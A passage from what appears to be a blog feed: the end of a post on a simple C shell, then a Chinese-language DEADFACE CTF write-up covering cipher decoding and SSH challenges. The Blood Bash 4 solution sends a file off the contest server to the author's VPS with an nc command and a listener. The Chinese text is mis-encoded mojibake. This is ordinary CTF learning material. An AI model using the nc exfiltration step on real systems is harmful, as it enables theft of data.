(WIFSIGNALED(status))</span><br><span class="line">                <span class="keyword">return</span> (WTERMSIG(status));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">executeCommand</span><span class="params">(<span class="type">char</span> **arr, <span class="type">int</span> status, <span class="type">int</span> num, <span class="type">int</span> back)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (arr[<span class="number">0</span>] == <span class="literal">NULL</span> || <span class="built_in">strcmp</span>(<span class="string">&quot;#&quot;</span>, arr[<span class="number">0</span>]) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arr[<span class="number">0</span>], <span class="string">&quot;exit&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arr[<span class="number">0</span>], <span class="string">&quot;status&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        printStatus(status);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arr[<span class="number">0</span>], <span class="string">&quot;cd&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="type">char</span> *directory;</span><br><span class="line">        <span class="keyword">if</span> (arr[<span class="number">1</span>] == <span class="literal">NULL</span>)</span><br><span class="line">            directory = getenv(<span class="string">&quot;HOME&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            directory = arr[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (chdir(directory) == <span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;cd: No such file or directory\n&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="type">int</span> t = newProcess(arr, num, back);</span><br><span class="line">        <span class="comment">// printf(&quot;------------%d---\n&quot;,t);</span></span><br><span class="line">        <span class="comment">// fflush(stdout);</span></span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> *input;</span><br><span class="line">    <span class="type">char</span> **arr;</span><br><span class="line">    <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigint</span> =</span> {<span class="number">0</span>};</span><br><span class="line">    sigint.sa_handler = SIG_IGN;</span><br><span class="line">    sigemptyset(&amp;sigint.sa_mask);</span><br><span class="line">    sigint.sa_flags = <span class="number">0</span>;</span><br><span class="line">    sigaction(SIGINT, &amp;sigint, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigtstp</span> =</span> {<span class="number">0</span>};</span><br><span class="line">    sigtstp.sa_handler = catchSIGTSTP;</span><br><span class="line">    sigfillset(&amp;sigtstp.sa_mask);</span><br><span class="line">    sigtstp.sa_flags = <span class="number">0</span>;</span><br><span class="line">    sigaction(SIGTSTP, &amp;sigtstp, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> back = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        input = readLine();</span><br><span class="line">        arr = parse(input, &amp;num, &amp;back);</span><br><span class="line">        status = executeCommand(arr, status, num, back);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//background</span></span><br><span class="line">        <span class="type">pid_t</span> childPid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG);</span><br><span class="line">        <span class="keyword">if</span> (childPid &gt; <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;background pid %d is done: &quot;</span>, childPid);</span><br><span class="line">            <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;exit value %d\n&quot;</span>, WEXITSTATUS(status));</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;terminated by signal %d\n&quot;</span>, status);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        }</span><br><span class="line">        fflush(<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">free</span>(input);</span><br><span class="line">        <span class="built_in">free</span>(arr);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><h2 id="wait-å‡½æ•°"><a href="#wait-å‡½æ•°" class="headerlink" title="wait()å‡½æ•°"></a>wait()å‡½æ•°</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pid_t</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span>* status)</span>;</span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">waitpid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span>* status, <span class="type">int</span> options)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>WNOHANG å¦‚æœè¯¥å­è¿›ç¨‹æ²¡æœ‰ç»“æŸï¼Œåˆ™ä»¥éé˜»å¡æ–¹å¼ç­‰å¾…å­è¿›ç¨‹ï¼Œå¹¶ä¸”è¿”å›0;å¦‚æœè¯¥å­è¿›ç¨‹å·²ç»ç»“æŸï¼Œè¿”å›å…¶pid.å¦‚æœæ²¡æœ‰å­è¿›ç¨‹é€€å‡ºï¼Œåˆ™ç«‹åˆ»è¿”å›-1</li>
<li>WUNTRACED  è‹¥å­è¿›ç¨‹è¿›å…¥æš‚åœçŠ¶æ€ï¼Œåˆ™é©¬ä¸Šè¿”å›</li>
</ul>
<h2 id="WIFEXTEDä¸WEXITSTATUS"><a href="#WIFEXTEDä¸WEXITSTATUS" class="headerlink" title="WIFEXTEDä¸WEXITSTATUS"></a>WIFEXTEDä¸WEXITSTATUS</h2><ul>
<li>WIFEXTED(status) è¿™ä¸ªå®ç”¨æ¥è·å–æ˜¯å¦æ­£å¸¸é€€å‡ºï¼Œæ­£å¸¸é€€å‡ºè·å¾—true</li>
<li>WEXITSTATUS(status) åªå¯åœ¨WIFEXITEDä¸ºtrueæ—¶ä½¿ç”¨ï¼Œè·å–æ­£å¸¸é€€å‡ºçš„çŠ¶æ€ç </li>
</ul>
<h2 id="WIFSIGNALEDä¸WTERMSIG"><a href="#WIFSIGNALEDä¸WTERMSIG" class="headerlink" title="WIFSIGNALEDä¸WTERMSIG"></a>WIFSIGNALEDä¸WTERMSIG</h2><ul>
<li>WIFSIGNALED(status) è¿™ä¸ªå®ç”¨æ¥è·å–æ˜¯å¦å¼‚å¸¸é€€å‡ºï¼Œå¼‚å¸¸é€€å‡ºè·å¾—true</li>
<li>WTERMSIG(status) åªå¯åœ¨WIFSIGNALEDä¸ºtrueæ—¶ä½¿ç”¨ï¼Œè·å–å¼‚å¸¸é€€å‡ºçš„çŠ¶æ€ç <figure class="highlight c"><figcaption><span>smallsh.c</span><a href="/downloads/code/smallsh.c">view raw</a></figcaption><table><tr><td class="code"><pre><span class="line">waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line">            <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">                <span class="keyword">return</span> (WEXITSTATUS(status));</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status))</span><br><span class="line">                <span class="keyword">return</span> (WTERMSIG(status));</span><br></pre></td></tr></table></figure></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <tags>
        <tag>Shell</tag>
        <tag>Cè¯­è¨€</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>DEADFACECTF Writeup</title>
    <url>/posts/2879210530/</url>
    <content><![CDATA[<h1 id="Poor-MEAGAN"><a href="#Poor-MEAGAN" class="headerlink" title="Poor MEAGAN!"></a>Poor MEAGAN!</h1><p><em>Oh, NO! Poor Megan! She&#39;s just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been scrambled somehow. Figure out how to unscramble &gt;the formula to save Megan from certain zombification. Enter the answer as flag{here-is-the-answer}.</em></p>
<p><em>The formula for the antidote: j2rXjx9dkhW9eLKsnMR9cLDVjh&#x2F;9dwz1QfGXm+b9&#x3D;wKslL1Zpb45</em></p>
<hr>
<p>çœ‹èµ·æ¥åƒä¸€ä¸ªbase64å­—ç¬¦ä¸²,ä½†æ˜¯ä¼¼ä¹è¢«æ··æ·†äº†,ä½¿ç”¨<a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('3GHIJKLMNOPQRSTUb%3DcdefghijklmnopWXYZ/12%2B406789VaqrstuvwxyzABCDEF5',true)&input=ajJyWGp4OWRraFc5ZUxLc25NUjljTERWamgvOWR3ejFRZkdYbStiOT13S3NsTDFacGI0NQ">CyberChef</a>æ­é…Megan35è§£ç å³å¯</p>
<p><img data-src="/../../CTF/DEADFACECTF/Crypto/images/Poor_Meagan.png" alt="CyberChef"></p>
<p><strong>flag:</strong><code>flag&#123;Six-Parts-Honey-One-Part-Garlic&#125;</code></p>
<h1 id="To-Be-Xor-Not-to-Be"><a href="#To-Be-Xor-Not-to-Be" class="headerlink" title="To Be Xor Not to Be"></a>To Be Xor Not to Be</h1><p><em>.$)&#x2F;3&lt;&#39;e-)&lt;e&#39;:e&amp;&#39;&lt;e&lt;&#39;e-)&lt;5</em></p>
<p><em>Submit the flag as flag{here-is-the-answer}</em></p>
<hr>
<p>ç›´æ¥ä½¿ç”¨<a href="https://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force(1,100,0,'Standard',false,true,false,'flag')&input=LiQpLzM8J2UtKTxlJzplJic8ZTwnZS0pPDU">CyberChef</a>é‡Œçš„XOR Brute Forceå³å¯:</p>
<p><img data-src="/../../CTF/DEADFACECTF/Crypto/images/To_Be_Xor_Not_to_Be.png" alt="To_Be_Xor_Not_to_Be"></p>
<p><strong>flag:</strong><code>flag&#123;to-eat-or-not-to-eat&#125;</code></p>
<h1 id="Blood-Bash"><a href="#Blood-Bash" class="headerlink" title="Blood Bash"></a>Blood Bash</h1><p><em>We&#39;ve obtained access to a system maintained by bl0ody_mary. There are five flag files that we need you to read and submit. Submit the contents of flag1.txt.</em></p>
<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
<p><em>bloodbash.deadface.io:22</em></p>
<hr>
<p>ä½¿ç”¨<code>ssh</code>å‘½ä»¤è¿æ¥,<code>ls - R</code>åå‘ç°<code>Documents</code>ç›®å½•ä¸‹æœ‰ä¸€ä¸ª<code>flag.txt</code>æ–‡ä»¶,ç›´æ¥<code>cat</code>å³å¯.</p>
<pre><code class="shell">â•­â”€ ~/CTF/DEADFACECTF
â•°â”€$ ssh bl0ody_mary@bloodbash.deadface.io
bl0ody_mary@bloodbash.deadface.io&#39;s password: 
bl0ody_mary@16ef1481fce1:~$ ls -R
.:
&#39;De Monne Customer Portal.pdf&#39;   Documents   Downloads   Music   Pictures   Videos

./Documents:
flag1.txt

./Downloads:

./Music:

./Pictures:

./Videos:
bl0ody_mary@16ef1481fce1:~$ cat Documents/flag1.txt
flag&#123;cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe&#125;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe&#125;</code></p>
<h1 id="Blood-Bash-2"><a href="#Blood-Bash-2" class="headerlink" title="Blood Bash 2"></a>Blood Bash 2</h1><p><em>We&#39;ve obtained access to a system maintained by bl0ody_mary. We believe bl0ody_mary stole a sensitive document and is storing it on her Linux machine. Search her system for any files relating to De Monne Financial.</em></p>
<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
<p><em>bloodbash.deadface.io:22</em></p>
<hr>
<p>åœ¨<code>Documents</code>ç›®å½•<code>ls -a</code>åå‘ç°å­˜åœ¨æ–‡ä»¶<code>.demonne_info.txt</code>,<code>cat</code>å³å¯</p>
<pre><code class="shell">bl0ody_mary@16ef1481fce1:~$ ls -a
.  ..  flag.txt  .demonne_info.txt
bl0ody_mary@16ef1481fce1:~$ cat .demonne_info.txt
flag&#123;a856b162978fe563537c6890cb184c48fc2a018a&#125;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;a856b162978fe563537c6890cb184c48fc2a018a&#125;</code></p>
<h1 id="Blood-Bash-3"><a href="#Blood-Bash-3" class="headerlink" title="Blood Bash 3"></a>Blood Bash 3</h1><p><em>There&#39;s a flag on this system that we&#39;re having difficulty with. Unlike the previous flags, we can&#39;t seem to find a file with this flag in it. Perhaps the flag isn&#39;t stored in a traditional file?</em></p>
<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
<p><em>bloodbash.deadface.io:22</em></p>
<hr>
<p>åœ¨Unix&#x2F;Linuxç³»ç»Ÿä¸­â€œä¸€åˆ‡çš†æ–‡ä»¶â€,socketä¹Ÿè¢«è®¤ä¸ºæ˜¯ä¸€ç§æ–‡ä»¶.</p>
<p>é¢˜æ„æç¤ºæˆ‘ä»¬flagæ²¡æœ‰è¢«å­˜å‚¨åœ¨ä¼ ç»Ÿæ–‡ä»¶ä¸­,è¿è¡Œ<code>netstat -ano</code></p>
<pre><code class="shell">bl0ody_mary@5349049d19cd:~$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
udp        0      0 127.0.0.1:43526         0.0.0.0:*                           off (0.00/0/0)
</code></pre>
<p>æ³¨æ„åˆ°æœ‰æœ¬åœ°43526ç«¯å£çš„ç›‘å¬(UDP),ç”¨<code>nc</code>è¿æ¥ä¸€ä¸‹</p>
<pre><code class="shell">bl0ody_mary@16ef1481fce1:~$ nc -u 127.0.0.1 43526
flag&#123;open_port(al)s&#125;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;open_port(al)s&#125;</code></p>
<h1 id="Blood-Bash-4"><a href="#Blood-Bash-4" class="headerlink" title="Blood Bash 4"></a>Blood Bash 4</h1><p><em>A sensitive file from De Monne was exfiltrated by mort1cia. It contains data relating to a new web portal they&#39;re creating for their consumers. Read the contents of the file and return the flag as <code>flag&#123;flag_goes_here&#125;</code>.</em></p>
<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
<p><em>bloodbash.deadface.io:22</em></p>
<hr>
<p>æµ‹è¯•åå‘ç°æ— æ³•ä½¿ç”¨<code>curl</code>,åªæœ‰<code>nc</code>å¯ä»¥ä½¿ç”¨.</p>
<p><code>nc</code>ä¹Ÿå¯ä»¥ç”¨æ¥ä¼ è¾“æ–‡ä»¶,é¦–å…ˆåœ¨è‡ªå·±çš„VPSä¸Šä½¿ç”¨<code>nc</code>ç›‘å¬6379ç«¯å£,å‡†å¤‡æ¥æ”¶æ–‡ä»¶</p>
<pre><code class="shell">root@VM-8-4-centos: ~$ nc -l 8000 &gt; a.pdf
</code></pre>
<p>åœ¨æ¯”èµ›çš„æœåŠ¡å™¨ä¸Šç”¨<code>nc</code>å‘é€æ–‡ä»¶</p>
<pre><code class="shell">bl0ody_mary@5349049d19cd:~$ nc -w 10 xx.xx.xxx.xxx 8000 &lt; De\ Monne\ Customer\ Portal.pdf
</code></pre>
<p>ä¸‹è½½pdfæ–‡ä»¶å¹¶æ‰“å¼€,å³å¯çœ‹åˆ°flag</p>
<p><img data-src="/../../CTF/DEADFACECTF/Forensics/images/Blood_Bash4.png" alt="Blood Bash 4"></p>
<h2 id="å¦ä¸€ç§è§£æ³•"><a href="#å¦ä¸€ç§è§£æ³•" class="headerlink" title="å¦ä¸€ç§è§£æ³•"></a>å¦ä¸€ç§è§£æ³•</h2><p>åœ¨æ¯”èµ›çš„æœåŠ¡å™¨ä¸Šä½¿ç”¨<code>base64</code>å‘½ä»¤å°†æ–‡ä»¶ç¼–ç ,å¤åˆ¶åä¿å­˜è‡³æœ¬åœ°æ–‡ä»¶<code>encoded</code></p>
<pre><code class="shell">~$ base64 De\ Monne\ Customer\ Portal.pdf
JVBERi0xLjYNJeLjz9MNCjExIDAgb2JqDTw8L0xpbmVhcml6ZWQgMS9MIDEyNDQ0L08gMTMvRSA4
MjgyL04gMS9UIDEyMTQxL0ggWyA0MzggMTQ1XT4+DWVuZG9iag0gICAgICAgICAgICAgICAgICAg
DQoxNiAwIG9iag08PC9EZWNvZGVQYXJtczw8L0NvbHVtbnMgMy9QcmVkaWN0b3IgMTI+Pi9GaWx0
ZXIvRmxhdGVEZWNvZGUvSURbPDAyRjM1ODk5M0MxRDE0NEU4Q0Y2RDJGMkEyNzlBQzRGPjwxRUIy
RkIxOTI5MURDRDREOTgzOTc3MTU5QzlBNzU5Nj5dL0luZGV4WzExIDddL0luZm8gMTAgMCBSL0xl
bmd0aCAzNi9QcmV2IDEyMTQyL1Jvb3QgMTIgMCBSL1NpemUgMTgvVHlwZS9YUmVmL1dbMSAyIDBd
Pj5zdHJlYW0NCmjeYmJkEGBiYDJnYmDwYWJg3AWkS5gY/m4Gsp0AAgwAI6cDxw0KZW5kc3RyZWFt
DWVuZG9iag1zdGFydHhyZWYNCjANCiUlRU9GDQogICAgICAgIA0KMTcgMCBvYmoNPDwvRmlsdGVy
L0ZsYXRlRGVjb2RlL0kgODIvTGVuZ3RoIDYxL08gNjYvUyAzNj4+c3RyZWFtDQpo3mJgYGBmYGBi
YgAC2eMMmICFgQOJxwzFDAwlDLxMBgwWXiA2IwODQjSEZrgD1sOgNw3KvwkQYACjPAUuDQplbmRz
dHJlYW0NZW5kb2JqDTEyIDAgb2JqDTw8L01ldGFkYXRhIDIgMCBSL091dGxpbmVzIDYgMCBSL1Bh
Z2VzIDkgMCBSL1R5cGUvQ2F0YWxvZz4+DWVuZG9iag0xMyAwIG9iag08PC9Db250ZW50cyAxNCAw
IFIvQ3JvcEJveFswLjAgMC4wIDYxMi4wIDc5Mi4wXS9NZWRpYUJveFswLjAgMC4wIDYxMi4wIDc5
Mi4wXS9QYXJlbnQgOSAwIFIvUmVzb3VyY2VzPDwvUHJvY1NldFsvUERGL0ltYWdlQ10vWE9iamVj
dDw8L0ltMCAxNSAwIFI+Pj4+L1JvdGF0ZSAwL1R5cGUvUGFnZT4+DWVuZG9iag0xNCAwIG9iag08
PC9MZW5ndGggNjY+PnN0cmVhbQ0KcQoyNzMuMDIwMDE5NSAwIDAgMzQuMTk5OTk2OSAxNjEuNzcw
NjkwOSA3MjQuMDk3Nzc4MyBjbQovSW0wIERvClEKDQplbmRzdHJlYW0NZW5kb2JqDTE1IDAgb2Jq
DTw8L0JpdHNQZXJDb21wb25lbnQgOC9Db2xvclNwYWNlL0RldmljZVJHQi9GaWx0ZXIvRENURGVj
b2RlL0hlaWdodCA1Ny9MZW5ndGggNzE1OC9OYW1lL1gvU3VidHlwZS9JbWFnZS9UeXBlL1hPYmpl
Y3QvV2lkdGggNDU1Pj5zdHJlYW0NCv/Y/+4ADkFkb2JlAGQAAAAAAf/bAMUADAgICAgIDAgIDBAL
CwsMDw4NDQ4UEg4OExMSFxQSFBQaGxcUFBseHicbFCQnJycnJDI1NTUyOzs7Ozs7Ozs7OwENCgoM
CgwODAwOEQ4ODA0RFBQPDxEUEBEYERAUFBMUFRUUExQVFRUVFRUVGhoaGhoaHh4eHh4jIyMjJycn
LCwsAg0KCgwKDA4MDA4RDg4MDREUFA8PERQQERgREBQUExQVFRQTFBUVFRUVFRUaGhoaGhoeHh4e
HiMjIyMnJycsLCz/3QAEAB3/wAARCAA5AccDACIAAREBAhEC/8QBogABAAMAAQQDAAAAAAAAAAAA
AAUGBwIBAwQICQoLAQEAAQEJAAAAAAAAAAAAAAAAAQIDBAUGBwgJCgsQAAADAwMDBAxZLQAAAAAA
AAECAwAEEQUGEgcTIRQxMkEVFiIjNkJRYXWBk7IICQoXGBkaJCUmJygpKjM0NTc4OTpDREVGR0hJ
SlJTVFVWV1hZWmJjZGVmZ2hpanFyc3R2d3h5eoKDhIWGh4iJipGSlJWWl5iZmqGio6Slpqeoqaqx
s7S1tre4ubrBwsPExcbHyMnK0dLT1NXW19jZ2uHi4+Tl5ufo6erw8fLz9PX29/j5+hEAAAECBAQH
cx0AAAAAAAAAAQACESExQQMSUWETQkNxgdHwBAUGBwgJChQVFhcYGRoiIyQlJicoKSoyMzQ1Njc4
OTpERUZHSElKUlNUVVZXWFlaYmNkZWZnaGlqcnN0dXZ3eHl6goOEhYaHiImKkZKTlJWWl5iZmqGi
o6SlpqeoqaqxsrO0tba3uLm6wcLDxMXGx8jJ8crS09TV1tfY2drh4uPk5ebn6Onq8vP09fb3+Pn6
/9oADAMAAAERAhEAPwDVWMYwhGN213h3dUjLvSpEUiXJRQwEIG/iIgAN4rpLsiSgY5HCUHV6MmQT
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
